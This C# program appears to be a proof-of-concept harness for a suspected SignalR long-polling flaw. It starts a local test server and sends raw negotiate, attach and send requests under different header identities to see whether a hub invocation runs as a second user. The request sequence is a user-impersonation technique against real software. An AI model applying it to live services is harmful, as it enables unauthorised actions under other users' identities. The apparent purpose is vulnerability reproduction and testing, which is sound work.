using System.Net.Http.Headers;
using System.Security.Claims;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Hosting.Server;
using Microsoft.AspNetCore.Hosting.Server.Features;
using Microsoft.AspNetCore.SignalR;

var builder = WebApplication.CreateBuilder(args);
builder.WebHost.UseUrls("http://127.0.0.1:0");
builder.Services.AddSignalR();

var app = builder.Build();
app.Use(async (context, next) =>
{
    var testUser = context.Request.Headers["X-Test-User"].ToString();
    if (!string.IsNullOrWhiteSpace(testUser))
    {
        var identity = new ClaimsIdentity(
            new[] { new Claim(ClaimTypes.Name, testUser) },
            authenticationType: "LocalSignalRPoC",
            nameType: ClaimTypes.Name,
            roleType: ClaimTypes.Role);
        context.User = new ClaimsPrincipal(identity);
    }
    await next();
});

app.MapHub<IdentityProbeHub>("/probe");
await app.StartAsync();

try
{
    var server = app.Services.GetRequiredService<IServer>();
    var addresses = server.Features.Get<IServerAddressesFeature>()
        ?? throw new InvalidOperationException("Kestrel address feature unavailable.");
    var address = addresses.Addresses.Single();
    using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(25) };

    Console.WriteLine($"Local test server: {address}");
    Console.WriteLine($"Runtime: {System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription}");

    var control = await RunScenario(client, address, "Alice", "Alice", "Alice");
    Console.WriteLine($"CONTROL same identity: {control.Status}; Hub saw: {control.Identity ?? "<none>"}");
    if (control.Status != ScenarioStatus.Completed || control.Identity != "Alice")
    {
        Console.WriteLine($"INCONCLUSIVE: positive control failed. {control.Detail}");
        Environment.ExitCode = 2;
        return;
    }

    // Target the suspected null-at-negotiate case: anonymous negotiation,
    // Alice on the first transport attach, then Bob on the send request.
    var candidate = await RunScenario(client, address, "", "Bob", "Alice");
    Console.WriteLine($"ANON-NEGOTIATE / ALICE-ATTACH / BOB-SEND: {candidate.Status}; Hub saw: {candidate.Identity ?? "<none>"}");
    if (candidate.Status == ScenarioStatus.Completed && candidate.Identity == "Bob")
    {
        Console.WriteLine("VULNERABILITY_REPRODUCED: Hub invocation executed as Bob after anonymous negotiation and Alice attach.");
        Environment.ExitCode = 0;
    }
    else if (candidate.Status == ScenarioStatus.Completed)
    {
        Console.WriteLine($"NOT_REPRODUCED: Hub observed '{candidate.Identity ?? "<anonymous>"}', not Bob.");
        Environment.ExitCode = 1;
    }
    else
    {
        Console.WriteLine($"INCONCLUSIVE: candidate did not complete. {candidate.Detail}");
        Environment.ExitCode = 2;
    }
}
finally
{
    await app.StopAsync();
}

static async Task<ScenarioResult> RunScenario(
    HttpClient client, string baseAddress,
    string negotiateIdentity, string sendIdentity, string attachIdentity)
{
    var root = baseAddress.TrimEnd('/');
    using var negotiate = new HttpRequestMessage(HttpMethod.Post, $"{root}/probe/negotiate?negotiateVersion=1");
    if (!string.IsNullOrWhiteSpace(negotiateIdentity))
        negotiate.Headers.Add("X-Test-User", negotiateIdentity);
    using var negotiateResponse = await client.SendAsync(negotiate);
    var negotiateBody = await negotiateResponse.Content.ReadAsStringAsync();
    if (!negotiateResponse.IsSuccessStatusCode)
        return new(ScenarioStatus.Rejected, null, $"Negotiate HTTP {(int)negotiateResponse.StatusCode}: {negotiateBody}");

    using var json = JsonDocument.Parse(negotiateBody);
    if (!json.RootElement.TryGetProperty("connectionToken", out var tokenElement))
        return new(ScenarioStatus.Rejected, null, "Missing connectionToken.");
    var token = tokenElement.GetString();
    if (string.IsNullOrWhiteSpace(token))
        return new(ScenarioStatus.Rejected, null, "Empty connectionToken.");

    using (var attach = new HttpRequestMessage(HttpMethod.Get, $"{root}/probe?id={Uri.EscapeDataString(token)}"))
    {
        attach.Headers.Add("X-Test-User", attachIdentity);
        using var attachResponse = await client.SendAsync(attach);
        if (!attachResponse.IsSuccessStatusCode)
            return new(ScenarioStatus.Rejected, null, $"Initial attach HTTP {(int)attachResponse.StatusCode}: {await attachResponse.Content.ReadAsStringAsync()}");
    }

    const char rs = '\u001e';
    var frames = "{\"protocol\":\"json\",\"version\":1}" + rs +
                 "{\"type\":1,\"invocationId\":\"identity-check-1\",\"target\":\"WhoAmI\",\"arguments\":[]}" + rs;
    using (var send = new HttpRequestMessage(HttpMethod.Post, $"{root}/probe?id={Uri.EscapeDataString(token)}"))
    {
        send.Headers.Add("X-Test-User", sendIdentity);
        send.Content = new ByteArrayContent(Encoding.UTF8.GetBytes(frames));
        send.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
        using var sendResponse = await client.SendAsync(send);
        var body = await sendResponse.Content.ReadAsStringAsync();
        if (!sendResponse.IsSuccessStatusCode)
            return new(ScenarioStatus.Rejected, null, $"Send HTTP {(int)sendResponse.StatusCode}: {body}");
    }

    var deadline = DateTime.UtcNow.AddSeconds(10);
    var observed = new List<string>();
    while (DateTime.UtcNow < deadline)
    {
        using var poll = new HttpRequestMessage(HttpMethod.Get, $"{root}/probe?id={Uri.EscapeDataString(token)}");
        poll.Headers.Add("X-Test-User", attachIdentity);
        using var response = await client.SendAsync(poll);
        var body = await response.Content.ReadAsStringAsync();
        if (!response.IsSuccessStatusCode)
            return new(ScenarioStatus.Rejected, null, $"Receive poll HTTP {(int)response.StatusCode}: {body}");
        if (body.Length == 0)
        {
            await Task.Delay(50);
            continue;
        }

        observed.Add(body);
        foreach (var frame in body.Split(rs, StringSplitOptions.RemoveEmptyEntries))
        {
            try
            {
                using var message = JsonDocument.Parse(frame);
                var obj = message.RootElement;
                if (obj.TryGetProperty("type", out var type) && type.GetInt32() == 3 &&
                    obj.TryGetProperty("invocationId", out var id) && id.GetString() == "identity-check-1" &&
                    obj.TryGetProperty("result", out var result))
                    return new(ScenarioStatus.Completed, result.GetString(), null);
                if (obj.TryGetProperty("type", out type) && type.GetInt32() == 7)
                    return new(ScenarioStatus.Rejected, null, $"Hub close frame: {frame}");
            }
            catch (JsonException) { }
        }
    }

    var diagnostic = string.Join(" | ", observed.Select(x => x.Replace(rs, '|')));
    return new(ScenarioStatus.NoCompletion, null, $"No invocation completion within 10s. Poll payloads: {diagnostic}");
}

public sealed class IdentityProbeHub : Hub
{
    public string WhoAmI() => Context.User?.Identity?.Name ?? "<anonymous>";
}

public enum ScenarioStatus { Completed, Rejected, NoCompletion }
public sealed record ScenarioResult(ScenarioStatus Status, string? Identity, string? Detail);
